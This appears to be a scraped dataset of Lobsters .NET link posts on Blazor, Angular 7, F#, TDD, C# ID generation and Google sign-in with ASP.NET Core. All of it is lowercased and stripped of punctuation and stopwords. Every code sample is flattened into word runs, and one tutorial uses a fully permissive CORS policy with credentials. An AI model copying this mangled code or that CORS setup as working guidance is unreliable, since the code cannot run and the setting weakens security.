project use razor blazor clientside rendered server instead html delivered browser via blazor framework client essence browser process everything project static resource since project treated set static resource lead interesting possibility yet seen aspnet ecosystem project built template hosted virtually resource serve static file example github page azure storage static website hosting template includes example get started blazor well basic page layout navigation control styling bootstrap project structure fairly simple resource outlined wwwroot web standard static resource including cs javascript json image html page razor cshtml application pagesfeatures shared common cshtml component page layout appcshtml temporary file removed later version blazor programcs startupcs application bootstrapping configuration first glance familiar concept may appear blazor us approach similar aspnet apps programcs startupcs common feature net apps blazor also utilizes similar concept aspnet core razor page blazor application page feature found page project path routing handled page page directive blazor framework view cshtml treated web component including marked page directive page myroute component markup function component logic blazor project include index counter fetch data example page item consistent throughout project type except fetch data key difference project type application hosted relation data consumes let begin examining counter page component markup logic counter counter page simple component decorated page directive component demonstrates basic composition blazor component including routing data binding event bindinghandling counter component us basic html button increment counter field displayed within paragraph tag blazor operates single page application interaction component happen client update browser document object model dom handled blazor framework though data binding moving fetch data page see blazor capable handing local data source fetch data project type fetch data page component utilizes data local static file fetch data component demonstrates dependency injection basic razor template concept version fetch data similar example found fullstack template except location data loaded top component following routing directive dependency injection declared inject directive instructs blazor resolve instance httpclient variable http httpclient used component logic fetch data using getjsonasync bind data json request array weatherforecast object page fetchdata inject httpclient http markup omitted brevity function weatherforecast forecast protected override async task oninitasync forecast await httpgetjsonasync weatherforecast sampledataweatherjson displaying weatherforecast data done iterating forecast collection binding value html table forecast null p em loading em p else table class table thead thead tbody foreach var forecast forecast tr td forecastdatetoshortdatestring td td forecasttemperaturec td td forecasttemperaturef td td forecastsummary td tr tbody table server used needed basic example plan develop application hosting web service fullstack serverside template may better starting point blazor fullstack blazor fullstack template encompasses project structure clientside template addition like clientside template html rendered server file delivered client static file including net binary difference however added aspnet core hosting web api shared project common application logic template includes three project clientside blazor application blazorclient aspnet core server application blazorserver shared net standard project common application logic blazorshared blazorserver server application responsible serving application providing web api endpionts data startupcs find mimetype setting configure server allow wasm dll file served addition compression enabled help reduce size binary file transferred client compression enabled addresponsecompression middleware servicesaddresponsecompression option optionsmimetypes responsecompressiondefaultsmimetypesconcat new mediatypenamesapplicationoctet wasmmediatypenamesapplicationwasm startup process also blazor application middleware initialized appuseblazor clientprogram identifies blazorclient application served public void configure iapplicationbuilder app ihostingenvironment env appuseresponsecompression appuseblazor clientprogram application come simple example web api controller action sampledatacontroller weatherforecasts action generates random set weather forecast fullstack template weatherforecasts web api replaces static weatherjson file found clientside template public class sampledatacontroller controller httpget action public ienumerable weatherforecast weatherforecasts blazorclient nearly client application identical clientside template however fetchdata example differs slightly requesting data weatherforcasts web api endpoint getjsonasync method call function weatherforecast forecast protected override async task oninitasync forecast await httpgetjsonasync weatherforecast apisampledataweatherforecasts blazorshared since project includes server client solution use net possible share code application scenario unique blazor since client running net client side instead javascript example given project template utilizes weatherforecast class server client application public class weatherforecast public datetime date get set public int temperaturec get set public string summary get set public int temperaturef int temperaturec weatherforcast class basic idea shared code however shared application code may include validation converter business logic decoupled system io web concept expanding idea theoretical application may share library net framework xamarin window universal platform uwp net based web application aheadoftime compilation aot net web technology like aspnet mvc core mvc razor template rendered server sent client html javascript framework like angular react share rendering responsibility client server process called aheadoftime compilation aot isomorphic rendering even though blazor client application hosted net server view rendered clientside clientside fullstack project template currently aotisomorphic rendering option blazor serverside blazor app model exist blazor serverside aka razor component september dotnetconf blazor serverside announced new feature aspnet core known aspnet razor component aspnet razor component first official nonexperimental release blazor framework blazor serverside project template take significantly different approach blazor application delivered interacts browser using serverside configuration blazor utilizes browser thinclient deploying signalr javascript application client server blazor implement signalr hub communicating client via web socket serverside hosting model blazor executed server within aspnet core app ui update event handling javascript call handled signalr connection configuration need webassembly blazor executed aspnet core runtime server ui update sent diffs bidirectionally binary packet web socket user application indistinguishable web application despite drastic difference blazor operates serverside actual application model stay relatively serverside project template difference example code provided template template includes two project serverside blazor application app aspnet core server application server host blazor app app indexhtml client entry point application configured serverside operation javascript file blazorserverjs replaces blazorwebassemblyjs blazorserverjs invokes signalr client establishes communication blazor serverside application wwwrootindexhtml doctype html html head head body app loading app script src frameworkblazorserverjs script body html entire application run server side project type fetch data example utilizes data local service inject directive example resolve instance weatherforecastservice place httpclient seen fullstack project template weatherforecastservice example simple class generates random data however realworld scenario service could entity framework database context repository source data page fetchdata inject weatherforecastservice forecastservice markup omitted brevity function weatherforecast forecast protected override async task oninitasync forecast await forecastservicegetforecastasync datetimenow weatherforecastservice service added dependency injection container configureservices method found startupcs public void configureservices iservicecollection service since blazor running server use application service read forecast data servicesaddsingleton weatherforecastservice server server project provided template simple aspnet core host startupcs project useserversideblazor middleware invoked blazor application startup initialized public void configure iapplicationbuilder app ihostingenvironment env appuseresponsecompression use component registration static file app project appuseserversideblazor appstartup pro con since small amount javascript required bootstrap client net assembly transferred client serverside blazor application efficient network traffic even operation network traffic light communication browser thinclient server small binary packet however web socket used client server must always connected mean blazor serverside apps work offline mode conclusion blazor extremely new framework still experimental phase ship several way get started project type includes similar set example counter fetch data component fetch data example varies project project showcase specific feature project type clientside fullstack serverside project template developer choose starting point best fit application requirement clientside template focus running static file completely browser fullstack template includes aspnet core hosting web api using serverside template utilizes blazor framework server relies signalr place webassembly thus trading performance dependency always connected excited blazor ready begin experimenting let u know comment plan blazor
224,Lobsters,dotnet,"C#, F#, .NET programming",Creating an Angular 7 App with ASP.NET Core: A Step-by-Step Guide,https://www.telerik.com/blogs/creating-an-angular-7-app-with-aspnet-core-step-by-step-guide,creating angular app aspnet core stepbystep guide,top change coming angular angular team officially announced angular introduced pretty awesome feature angular spa template aspnet core spa visual studio angular cli create angular application using net core template v angular angular major feature cli talkative angular material improvement install angular material drag drop feature virtual scrolling ability use native select angular material performance improvement production bundle budget feature blog angular console angularfire nativescript stackblitz angular language service upgrade existing angular application angular http updateangulario new angular kendo ui angular,angular arrived neel bhat provides stepbystep guide creating angular app using aspnet core spa template visual studio finally new major version angular version reason use word finally people waiting latest major release angular also quite rumor feature angular would offer especially since april fool article published title top change coming angular angular team officially announced angular day back angular introduced pretty awesome feature like improvement angular material performance improvement cli improvement name article see create angular application aspnet core spa template also see feature introduced major release demo angular material feature introduced angular angular spa template let first see create angular application aspnet core spa template using visual studio way one create angular application net core let look one make sure installed visual studio latest net core sdk well latest version node approach use angular template asp net core starting let u first update angular cli version open command prompt run command npm g angularcli done cli updated version create angular application using net core template v installed open visual studio create new project select core web application click ok next window select angular shown visual studio create wellstructured application currently angular angular open packagejson file clientapp folder notice angular version want create angular application go file explorer delete clientapp folder folder deleted open command prompt navigate project run command ng new clientapp command create brand new angular application latest version created angular application run application using command ng serve angular major feature let examine major feature released angular cli talkative angular onwards cli prompt user run command like ng new ng add help user choose feature like routing sc support etc see reply either yesno selecting option using updown arrow key angular material improvement component dev kit cdk improved use functionality like virtual scrolling drag drop let see using angular install angular material let u first install angular material using command npm install save angularmaterial angularcdk angularanimations done add browseranimationsmodule appcomponentts import browseranimationsmodule angularplatformbrowseranimations ngmodule import browseranimationsmodule ready use angular material angular drag drop feature remember stackoverflow question personally wished would part material angular onwards able drag drop using material drag item horizontally vertically one list another list reordering list opening draggable item etc first need add dragdropmodule appcomponentts import dragdropmodule angularcdkdragdrop ngmodule import dragdropmodule let create horizontal drag drop add code appcoponenthtml div cdkdroplist cdkdroplistorientation horizontal class examplelist cdkdroplistdropped drop event div class examplebox ngfor let timeperiod timeperiods cdkdrag timeperiod div div next need timeperiods add code appcomponentts timeperiods bronze age iron age middle age early modern period long nineteenth century drop event cdkdragdrop string moveiteminarray thistimeperiods eventpreviousindex eventcurrentindex set run application using ng serve find detail virtual scrolling virtual scrolling using angular material version load unload dom element based display size create fast experience user even scrolling list huge first need add scrolldispatchmodule appcomponentts import scrolldispatchmodule angularcdkscrolling ngmodule import scrolldispatchmodule let add virtual scrolling angular app add code appcoponenthtml cdkvirtualscrollviewport itemsize class exampleviewport div cdkvirtualfor let item item class exampleitem item div cdkvirtualscrollviewport next need item add code appcomponentts item arrayfrom length map item run application using ng serve detail found ability use native select angular material angular onwards angular material allow using native select inside matformfield know native select powerful native element native select performance accessibility usability advantage matselect would nice use native select performance improvement production angular team noticed common mistake developer adding reflectmetadata polyfill production although required development angular onwards automatically removed polyfillsts add build step running development mode bundle budget feature bundle mb warned application bundle mb get error application configurable change setting angularjson file budget type initial maximumwarning maximumerror way get used creating application low bundle size possible major feature angular let quickly mention feature shipped angular stephen fluin mention blog angular console downloadable console starting running angular project local machine angularfire angularfire new home npm first stable release angular nativescript possible single project build web installed mobile nativescript stackblitz stackblitz released includes angular language service feature like tabbed editing lastly want upgrade existing angular application angular angular team made step easier run command ng update angularcli angularcore really fast way upgrade take look check detail regarding upgrading big application http updateangulario find source code application created angular hope help looking info everything new angular learn new angular looking beautiful ui component designed angular speed development nt forget check kendo ui angular
225,Lobsters,dotnet,"C#, F#, .NET programming",F# 2018 Advent Calendar,https://sergeytihon.com/2018/10/22/f-advent-calendar-in-english-2018/,f advent calendar,update vote suggestion reed copsey dec dec dec dec dec dec dec c advent calendar q advent calendar join f advent calendar today rule twitter fsharp fsadvent calendar like,update vote showed demand extra f advent slot going follow suggestion reed copsey add new slot portion start slot dec dec week filled add slot dec dec dec dec finally dec f advent calendar long tradition f community f advent calendar english f advent calendar japanese became inspiration c advent calendar q advent calendar advent coming year free slot please join reserve slot spread thought love f community lot amazing initiative developed year f giraffe zebra fabulous saturn tp sdk net core fake early history f syme finally became f hero much join f advent calendar today rule choose f related topic blog post reserve slot twitter leave comment post please note announce topic date prepare blog post english publish post specified date according calendar post link post twitter hashtags fsharp fsadvent calendar like like loading related
226,Lobsters,dotnet,"C#, F#, .NET programming",What is TDD? [Roadmap to Implement TDD in Your Organization],https://simform.com/what-is-tdd/,tdd roadmap implement tdd organization,better code,advantage tdd code qualitytdd encourages development simple clean meaningful code discipline following tdd would naturally develop habit lead better code part developer everyday practice developer become focused system requirement firstly asking feature needed proceeding implementation process developer identify badly defined requirement producing unit test becomes taxing tdd help developer towards simple design keep thing typically oo object oriented structured push developer towards separated componentsapplication qualityanother advantage writing breakpoint test production code developer spent time designing boundary case needing covered test compared traditional approach result thorough testing fewer defect end development cycleincreases developer productivitytdd improves speed developer need spend time debugging mayincrease time spent developing test production code early phase development progress adding testing new functionality quicker requires le rework lot cheaper term resource fix issue immediately rather month track may discovered frustrating write test frustrating able change something know change safehigher test coveragehigher test density test coverage default advantage tdd traditional approach higher likelihood testing would left restricted critical functionality particularly time short hand tdd institute discipline functionality associated set automated unit test result test higher test coverage code living documentationtests serve documentation developer unsure class library work go read test tdd test usually get written different scenario one probably want use class see expected input method requires expect outcome based assertion made testthis help increase developer understanding part system therefore help support collective code ownership result change code made developer rather developer understands code
227,Lobsters,dotnet,"C#, F#, .NET programming",Get Started with Blazor and WebAssembly,https://developer.okta.com/blog/2018/10/15/blazor-and-web-assembly,get started blazor webassembly,advantage blazor building first blazor webassembly app net core sdk blazor language service extension file new project solution explorer new project ok ok property debug app url app url update blazor api enable cors blazor api update blazor application learn blazor webassembly secure web development http githubcomoktadeveloperblazorexample twitter facebook linkedin youtube channel,modern web dev probably using javascript recently serious choice web development u may j primary language competency still interested building web apps world beginning change today webassembly wasm webassembly alternative way developing web application require know javascript webassembly new type code run modern web browser provides new feature major gain performance primarily intended written hand rather designed effective compilation target language designed run alongside javascript allows load webassembly module javascript using webassembly javascript apis microsoft closely following progress webassembly recently decided get serious experimenting last year august announced net coming browser using mono runtime month got blazor net web framework using power razor c run browser webassembly spa web framework feature modern web framework like component model routing layout form validation di live reloading serverside rendering full net debugging browser ide running blazor browser really depends browser support webassembly luckily modern browser support webassembly includes edge edge mobile chrome chrome android firefox firefox android safari io safari samsung internet advantage blazor net developer able use favorite language framework build client side application well also able share model code business logic server side code client side code huge shared code server client always dream many net developer onboarding new developer project lot easier since need know yet another major language also backend developer work frontend task going realistic enjoyable developer building first blazor webassembly app net core sdk visual studio later aspnet web development workload installed finally install blazor language service extension create blazor app using builtin template within visual studio start scratch visual studio select file new project select location code stored create simple api project act serverside api visual studio right click solution inside solution explorer new project choose existing folder application click ok choose api template uncheck configure http click ok want specify port blazor application api right click project solution explorer click property main property window choose debug lefthand menu find web server setting section blazor project set app url property http api project set app url property http update solution property startup project within solution explorer right click solution file oktablazor property startup project tab make sure following setting update blazor api api project update valuescontroller following content using microsoftaspnetcoremvc using systemcollectionsgeneric namespace oktablazorapicontrollers route api controller apicontroller public class valuescontroller controllerbase get apivalues httpget public actionresult ienumerable string get new okta blazor net razor enable cors blazor api want able fetch data server need enable cors api inside configureservices method within startup class add following servicesaddcors option optionsaddpolicy corspolicy builder builder allowanyheader allowanymethod allowcredentials withorigins http inside configure method appusemvc line add following appusecors corspolicy update blazor application back oktablazor project inside page folder fetchdatacshtml file represents blazor component update file following content page fetchdata inject httpclient http blazor p component demonstrates fetching data server p word null p em loading em p else foreach var word word span word span br function string word protected override async task oninitasync word await httpgetjsonasync string http run application pressing ctrl simply need anything special configure simply work since blazor everything blazor compile net code j download net assembly browser load help mono execute directly browser via webassembly learn blazor webassembly secure web development blazor experimental technology perspective replace current major clientside framework eventually still productionready framework promise enjoyable full spa framework powered c razor turn true microsoft probably aiming make solid replacement used spa framework react angular vue time pass sure webassembly framework compete razor however seems microsoft starting invest blazor taking seriously possibility use c skill frontend application blazor open space whole new ecosystem inside net world hence see many nuget library aiming help replace library use clientside playing around blazor hope follow progress future definitely seems interesting promise lot still need see microsoft kind tooling offer visual studio outside visual studio also interesting see community react build healthy ecosystem around blazor create amazing clientside library find source code complete application following link http githubcomoktadeveloperblazorexample great resource check well also learn aspnet developer blog always question feel free post comment forget follow u twitter facebook linkedin also check youtube channel
228,Lobsters,dotnet,"C#, F#, .NET programming","Generating IDs in C#, 'safely' and efficiently",http://www.nimaara.com/2018/10/10/generating-ids-in-csharp/,generating id c safely efficiently,httpcontext code comment code impressive stuff although workarounds c bit going measure performance net core core logical million time stackalloc second million heap allocation millisecond doubled reusing buffer wait second locking buffer extra second valid test realistic scenario billion stackalloc parallel new buffer parallel locking buffer parallel time noncontended dottrace spin locking albahari good evil shared state threadstatic static field msdn second threadlocal tl side note easymessagehub bonus point ben adam pull request bound checking conclusion easycommon happy ing thing,recently needed find efficient algorithm generating unique id highly concurrent low latency component looking several option settled algorithm used kestrel http server kestrel generates request id stored traceidentifier property hanging httpcontext id encoded increment long seeded based datetimeutcnowticks using character v let look code internal static class correlationidgenerator private static readonly string private static long lastid datetimeutcnowticks public static string getnextid generateid interlockedincrement ref lastid private static unsafe string generateid long id char charbuffer stackalloc char charbuffer int id charbuffer int id charbuffer int id charbuffer int id charbuffer int id charbuffer int id charbuffer int id charbuffer int id charbuffer int id charbuffer int id charbuffer int id charbuffer int id charbuffer int id return new string charbuffer invoke like correlationidgeneratorgetnextid threadsleep correlationidgeneratorgetnextid threadsleep correlationidgeneratorgetnextid get overall code efficient construct string representation id based long avoiding tostring call according comment code would slower respectively also avoids allocating memory heap avoiding frequent gc collection invoked hot path allocating char stack populating encoded value passing char pointer string constructor impressive stuff allocating memory stack using stackalloc long used performance trick faster heap allocation also avoids gc however caveat stackalloc explicitly unsafe hence used safe title article mean would compile assembly using unsafe flag mean assembly may blacklisted environment loading unsafe assembly permitted eg sqlserver although workarounds also note c unsafe longer required long use span using stackalloc amount data allowed allocate limited managed stack limited size even le running ii stack frame take chunk space deeper stack le memory available exception thrown allocation get stackoverflowexception best known exception caught fair kestrel allocates small block memory generating id therefore chance overflowing rare however still prefer safe side point mind got curious see avoid using unsafe measure performance impact going without try close gap performance much possible bring reasonable level bit going measure performance yet read previous article suggest look get familiar term tool overall approach profiling related performance gc going start coarsegrainedhighlevel measurement get general idea behaviour gc running time baseline algorithm start playing thing running net core application hosted window server machine dual cpu xeon processor core logical clocking also note gc mode application set workstation emphasise impact gc collection process refer link finding difference workstation server overall result benchmark still valid server mode enabled let start generating million id measuring execution time gc behaviour repeat time look average value across execution code generating id var sw stopwatchstartnew var string id correlationidgeneratorgetnextid swstop using var process processgetcurrentprocess consolewriteline execution time rn swelapsedtostring gccollectioncount gccollectioncount gccollectioncount notsofancy code start timer generates lot id measure many time gc collection occurres across generation stackalloc way average value baseline execution time okay took around second gc generate id wondering collection despite allocating stack well answer allocating char stack still need allocate million string object heap know baseline behaves let u measure would done allocated char heap instead stack heap allocation version remove unsafe keyword new char everything else unchanged private static string generateid long id var buffer new char buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id return new string buffer right let measure guy execution time allocating heap seems millisecond slower allocating stack however doubled number gc may saying dude nt matter gc super fast would right collection fast unlike collection blocking id generate frequent blocking collection wasting cpu cycle reducing overall throughput may problem application fair enough scenario need reduce allocation much possible okay simple method reducing allocation reusing char say sure let try reusing buffer need declare field reusable char buffer overwrite every id generate private static readonly char buffer new char private static string generateid long id var buffer buffer execution time excellent awesome gain super fast allocation let wrap wait second unsafe version threadsafe version want generate id different thread parallel worry ensure access char synchronised across thread going use simple lock locking buffer rest code unchanged let lock body method private static string generateid long id lock buffer var buffer buffer run benchmark execution time okay allocation actual string representation id see cost using lock extra second overhead valid test even though threadsafe method far generated id single thread representative code used wild realistic scenario going sprinkle bit parallelism benchmarking code generating billion id across thread parallel updated code benchmarker const int iterationcount const int threadcount var sw stopwatchstartnew parallelenumerable range iterationcount withdegreeofparallelism threadcount withexecutionmode parallelexecutionmodeforceparallelism forall string id correlationidgeneratorgetnextid swstop using var process processgetcurrentprocess consolewriteline execution time rn swelapsedtostring gccollectioncount gccollectioncount gccollectioncount stackalloc parallel updated benchmarker need run baseline see parallel execution time okay new buffer parallel reminder version creating new char time generating id let u see performance allocaty method parallel execution time see high number allocation except time allocation also increasing locking buffer parallel worry control avoiding nasty allocation thanks friend mr lock let go execution time yep look like mr lock nt much friend took u time longer also collection nt acquiring lock fast well depends acquiring noncontended lock extremely fast n contended context switch depending number competing thread quickly increase microsecond case resulted noticeable performance hit indeed profile app using dottrace refer previous blog post detail see spent whopping total execution time waiting lock contention click enlarge thread barely utilising cpu let compare stackalloc version see nice healthy thread context switch wasting cpu cycle could somehow reduce spin locking guess avoid context switch using spinlock spinlock let lock without incurring cost context switch expense keeping thread spinning uselessly busy albahari going use code private static readonly char buffer new char private static spinlock spinner new spinlock false private static string generateid long id bool locktaken false try spinnerenter ref locktaken var buffer buffer return new string buffer finally locktaken spinnerexit important almost never use spinlock come many gotchas one unlike lock aka monitor spinlock reentrant figure set constructor parameter false spinner field declared readonly mean using spinlock fully understand work still nt totally erase memory spinlock head seriously use nevertheless look satisfy curiosity let see difference spinlock make execution time look like time much better many context switch locking let u closer look process actually even though contention spent total execution time running rest spinning wasting precious cpu time good evil shared state sharing char across worker thread seem good choice eliminate shared resource time avoid allocating way thread buffer work well net facility allows u threadstatic static field marked threadstatic attribute attached thread thread copy think container hold separate instance field every thread static field marked threadstaticattribute shared thread executing thread separate instance field independently set get value field field accessed different thread contain different value msdn using threadstatic required specify initial value field initialisation occurs static constructor class executed therefore value set thread executing constructor accessed subsequent thread initialised default value case thread try use buffer first time need make sure field thread initialised new char otherwise value null code look like threadstatic threadstatic private static char buffer private static string generateid long id buffer null buffer new char var buffer buffer let see one execution time okay getting reduced execution time around second let u see thread performed talking see image thread showing healthy utilisation overall spent time running wanted eliminating shared buffer also remove contention worker thread enabling work independently bottleneck okay good better little bit faster threadlocal starting threadlocal provides thread local storage tl data also improves threadstatic providing strongly typed locally scoped container store value specific thread unlike threadstatic mark instance static field also allows use factory method create initialise value lazily first access thread side note used threadlocal trick many time past including easymessagehub highperformance event aggregator read avoid locking remove contention thread armed new friend present final version code private static readonly threadlocal char buffer new threadlocal char new char private static string generateid long id var buffer buffervalue buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id buffer int id return new string buffer bufferlength let take spin execution time like managed beat stackalloc version profiling snapshot see clean healthy utilisation across thread bonus point shortly publishing article ben adam author original pull request kestrel id generation reminded new stringcreate method allows u avoid stack heap allocation buffer write directly string memory need net core know length string advance method allocates string give span char allowing essentially write directly string memory heap version would look like public static string generateid long id stringcreate id writetostringmemory private static readonly spanaction char long writetostringmemory convert method group otherwise allocate span id writetostringmemory span id private static void writetostringmemory span char span long id span int id span int id span int id span int id span int id span int id span int id span int id span int id span int id span int id span int id span int id ready see result execution time process hmm expected could spending little much time bound checking let give jit little help reversing buffer population private static void writetostringmemory span char span long id span int id span int id execution time excellent conclusion discussed focus avoid using unsafe whilst trying minimise potential drop performance goal faster baseline turned managed shave little bit also nice included final version method idgenerator easycommon also find benchmark code hope enjoyed article comment happy threadlocaling thing
229,Lobsters,dotnet,"C#, F#, .NET programming",Sign in with an External Login Provider in an Angular Application Served by ASP.NET Core,https://www.blinkingcaret.com/2018/10/10/sign-in-with-an-external-login-provider-in-an-angular-application-served-by-asp-net-core/,sign external login provider angular application served aspnet core,quite step required make happen traditional web application google identity platform angular login logout property window prefetch url service detecting user authenticated hook angular initialization process cors request secure aspnet core web api using cooky detecting user logged interceptor aspnet core using identity create new google application http consoledevelopersgooglecomprojectselectorapislibrary configure authentication middleware aspnet core middleware pipeline authorization code grant flow external login provider aspnet core cors angular aspnet core secure web api aspnet core jwt secure aspnet core web api using cooky produce error external login provider aspnet core initiating sign google google http protocol unauthorized response returned header named included handling successful authentication external login provider aspnet core principle reasonable expectation handling logout authentication scheme,able sign external login provider example google facebook good way simplify process getting new user website quite step required make happen traditional web application far know guide achieve using modern frontend framework angular react vue together aspnet core backend blog post description angular application rely google authentication using aspnet core backend long blog post feel area could expanded also planned describe version using aspnet identity one without word decided would much went aspnet identity version complicate thing even picked google external login provider aware google identity platform blog post still much valid useful approach work external login provider also great deal described would also necessary using google identity platform find github repository angular aspnet core application look like run angular front end goal way detecting user authenticated depend particular external login provider used although example rest blog post use google nothing angular application specific depends google external login provider ie work login provider another goal detect user signed example user open two tab sign one tab able handle scenario gracefully finally must possible initiate process logging angular application let start login logout relying aspnet core backend need send user particular url handled aspnet core application url initialize process signing external login provider imagine url http wwwmywebsitecomaccountsigninwithgoogle used using angular routing service might think use redirect user url unfortunately router service work url internal angular application solution much mundane actually change href property window location right way angular invoke windowlocationhref would work lose ability unit test method make call since important part angular testable code could thing making code harder test import injectable inject angularcore import document angularcommon injectable export class loginservice constructor inject document private document document login thisdocumentlocationhref http wwwmywebsitecomaccountsigninwithgoogle advantage since document injected using angular dependency injection mechanism writing test code able easily replace document something control test spy regarding logout tempting think could use approach ie call endpoint aspnet core take care logging u redirecting user back angular application good practice though reason considered good practice browser prefetch url typing address bar mean typing example http wwwmywebsitecomaccount browser might autocomplete http wwwmywebsitecomaccountlogout one option actually try prefetch url logging intend instead make logout endpoint respond post use angular httpclient service perform post request example import httpclient angularcommonhttp export class loginservice constructor private httpclient httpclient logout thishttpclientpost acountlogout subscribe redirect user page require authentication detecting user authenticated imagine someone sends link page application requires user logged ideally angular application able determine starting user already authenticated thankfully angular allows u provide function run application initializing take advantage query backend determine user authenticated specify initialization function need add provider list main appmodule module look appmodule function named checkifuserisauthenticated depends accountservice service import httpclientmodule httpclient angularcommonhttp import appinitializer ngmodule angularcore import checkifuserisauthenticated checkloginintializer ngmodule provider provide appinitializer usefactory checkifuserisauthenticated multi true deps accountservice checkifuserisauthenticated function look like import accountservice securityservice export function checkifuserisauthenticated accountservice accountservice return accountserviceupdateuserauthenticationstatus topromise updateuserauthenticationstatus method accountservice performs request aspnet core backend return true false depending user loggedin example could look like injectable providedin root export class securityservice private isuserauthenticatedsubject new behaviorsubject boolean false isuserauthenticated observable boolean thisisuserauthenticatedsubjectasobservable constructor inject document private document document private httpclient httpclient updateuserauthenticationstatus return thishttpclientget boolean environmentapiurl accountisauthenticated withcredentials true pipe tap isauthenticated thisisuserauthenticatedsubjectnext isauthenticated service expose observable named isuserauthenticated use component notified user authentication status since observable use signal user signed going next one note using appinitializer go initializer function must return promise nothing returning promise promise fails rejected application start left blank screen error handling definitely needed want provide good user experience want information appinitializer recommend hook angular initialization process also never seen withcredentials option required aspnet core backend different origin therefore request angular aspnet core cors request recommend secure aspnet core web api using cooky want detailed information topic detecting user logged one scenario want support detect user log example different tab try make request expecting user authenticated angular provides way inspect request sent response received type service named interceptor leverage detect unauthorized response react appropriately example project update observable isuserauthenticated angular service accountservice component might active page subscribe observable react appropriately user becoming unauthorized interceptor look like import httperrorresponse httphandler httpinterceptor httprequest angularcommonhttp import injectable angularcore import tap rxjsoperators import accountservice accountservice injectable export class implement httpinterceptor constructor private accountservice accountservice intercept req httprequest next httphandler return nexthandle req pipe tap nonerrorevent nothing error httperrorresponse errorstatus thisaccountservicesetuserasnotauthenticated need added provider list appmodule import httpinterceptors angularcommonhttp import ngmodule provider provide httpinterceptors useclass multi true take advantage need add accountservice dependency component subscribe isuserauthenticated observable look like import component ondestroy oninit angularcore import subscription rxjs import accountservice accountservice component selector apphome templateurl homecomponenthtml styleurls homecomponentcss export class homecomponent implement oninit ondestroy subscription subscription constructor private accountservice accountservice ngoninit thissubscription thisaccountserviceisuserauthenticatedsubscribe isauthenticated isauthenticated user became authenticated else user authenticated ngondestroy thissubscriptionunsubscribe aspnet core using identity allow user authenticate using external login provider aspnet core use aspnet core identity aspnet core identity offer u ability interact several external login provider using oauth save user predefined set table aspnetusers etc although exploring identity even functionality associate manage several different external login provider user proceed need create app google get clientid clientsecret needing configure google authentication middleware create new google application create new app following following link http consoledevelopersgooglecomprojectselectorapislibrary first step create new project app next need name project application called google developer website example naming googlesigninexample next step enable google api access search apis functionality clicking library left sidebar menu click enable confirm want enable api go credential section project click create credential select oauth client id configure oauth consent screen defines displayed user try login application using google back credential screen select web application specify authorized javascript origin authorized redirect uris origin refers request coming application since aspnet core run port default use command line used also github example project us authorized redirect uris location google redirect user login process finish setting google external login provider aspnet core specify value default signingoogle since obvious used nondefault googlecallback value show explicitly specify redirect uri finally get client id client secret make note two value using configure authentication middleware aspnet core configure authentication middleware aspnet core even though configuration authentication middleware terse first glance seems simple lot going obvious fully comprehend authentication middleware work scenario need familiar middleware pipeline work aspnet identity register configureservices familiar oauth flow namely authorization code grant flow going assume know pipeline work happens user get redirected external login provider google back want indepth discussion little bit outdated term aspnet core much still relevant recommend reading external login provider aspnet core without ado configureservices method startupcs public void configureservices iservicecollection service servicesaddmvc servicesaddcors corsoptions corsoptionsaddpolicy fully permissive configurepolicy configurepolicyallowanyheader allowanymethod allowanyorigin allowcredentials servicesadddbcontext identitydbcontext option optionsusesqlite data sourceuserssqlite sqliteoptions sqliteoptionsmigrationsassembly thenameofyouraspnetcoreprojectgoeshere servicesaddidentity identityuser identityrole addentityframeworkstores identitydbcontext adddefaulttokenproviders servicesaddauthentication option optionsdefaultsignoutscheme identityconstantsapplicationscheme addgoogle google option optionscallbackpath new pathstring googlecallback optionsclientid yourclientidfromgoogle optionsclientsecret yourclientsecretfromgoogle first thing registered configureservices mvc cors setup cors permissive might noticed named policy might might appropriate depending angular aspnet core setup want read different option regarding recommend post angular aspnet core several deployment option described including one require cors also relying cooky store user identity reason work check secure web api aspnet core describes use jwt instead cooky also refer secure aspnet core web api using cooky want indepth example cooky work approach taking blog post cors setup aspnet core identity defining version identitydbcontext specify want create migration aspnet core project migrationsassembly part default migration created assembly dbcontext derived class defined identitydbcontext defined microsoftaspnetcoreidentityentityframeworkcore assembly would produce error spend much time explaining setup aspnet core identity mentioning call addidentity actually configuring authentication middleware ie addidentity call addauthentication internally since convenient defaultsignoutscheme applicationscheme scheme actually creates user identity ie set httpcontextuser order addauthentication addidentity important addauthentication need addidentity else custom setting overwritten comment left feeling lost recommend spending time reading external login provider aspnet core little bit outdated still applicable version net core apart one authentication middleware finally configuration google external login provider named authentication scheme google first parameter addgoogle important later want produce challenge initiate login process google use clientid clientsecret callbackpath previously defined registering application google google developer website regarding definition pipeline configure method could look like public void configure iapplicationbuilder app ihostingenvironment env envisdevelopment appusedeveloperexceptionpage appusecors fully permissive appuseauthentication appusemvcwithdefaultroute initiating sign google way initiate authentication process using external login provider google issuing challenge target authentication scheme corresponds external login provider configured google external login provider startupcs gave authentication scheme name google addgoogle google name use challenge case wondering term challenge used probably http protocol unauthorized response returned header named wwwauthenticate included value header defines challenge client must overcome order access protected resource aspnet challenging authentication scheme trigger challenge behavior defined authentication handler associated authentication scheme case redirecting user google sign page look like controller action public class accountcontroller controller private readonly signinmanager identityuser signinmanager private readonly usermanager identityuser usermanager public accountcontroller signinmanager identityuser signinmanager usermanager identityuser usermanager signinmanager signinmanager usermanager usermanager public iactionresult signinwithgoogle var authenticationproperties signinmanagerconfigureexternalauthenticationproperties google urlaction nameof handleexternallogin return challenge authenticationproperties google part configuring challenge external login provider requires u provide redirect url url user redirected successfully authenticating google case redirecting user accounthandleexternallogin handling successful authentication first thing happens challenge initiated user redirected external login provider user successfully authenticates using external login provider login page user get redirected back application redirect url callback url specified external login provider configuration aspnet provider google authorized redirect uri redirect contain singleuse code query string aspnet application authentication middleware external login provider exchange code making http call google user claim set external cookie transparent find authentication scheme name cookie identityconstantsexternalscheme aspnet core authentication middleware external login provider redirect user url specified challenge example accounthandleexternallogin action discussing section terribly complicated make matter worse come next even though line code load going obscure however come box using aspnet core identity best explain going feel need get better grasp process aspnet application external login provider look external login provider aspnet core handleexternallogin look like public async task iactionresult handleexternallogin var info await signinmanagergetexternallogininfoasync var result await signinmanagerexternalloginsigninasync infologinprovider infoproviderkey ispersistent false resultsucceeded user exist yet var email infoprincipalfindfirstvalue claimtypesemail var newuser new identityuser username email email email emailconfirmed true var createresult await usermanagercreateasync newuser createresultsucceeded throw new exception createresulterrorsselect e edescription aggregate error error error error await usermanageraddloginasync newuser info var newuserclaims 